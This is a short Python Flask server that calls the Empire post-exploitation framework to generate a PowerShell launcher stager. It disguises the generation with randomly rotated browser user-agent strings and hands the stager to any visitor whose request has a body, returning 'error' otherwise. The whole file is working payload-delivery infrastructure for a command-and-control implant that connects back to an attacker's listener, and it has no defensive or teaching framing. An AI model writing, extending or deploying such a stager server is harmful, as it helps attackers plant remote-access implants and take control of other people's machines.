from flask import Flask
from flask import request
app = Flask(__name__)
import subprocess
import random


def user_agent():
    ua_pool= [
        'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like 11)',
        'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
        'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36'
    ]
    ua = random.choice(ua_pool)
    return ua

def shell_generator():

    out = subprocess.Popen(['python', 'empire', '-s', 'launcher', '-o', 'Listener=mylistener', 'UserAgent={ua}'.format(ua=user_agent())],
                           stdout=subprocess.PIPE)
    c = out.stdout.read().decode().split('\n')[1]
    return c


@app.route("/", methods=['GET', 'POST'])
def home():
    valid = (request.data).decode()
    print(valid.__len__())
    print('HELOO NEW VISITOR:')
    if valid.__len__() != 0:

        #Place for Your PowerShell
        html = shell_generator()
        print('return: \n', html)
        print('Return powershell')

    else:
        html = 'error'
        print('Return error')

    return html


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
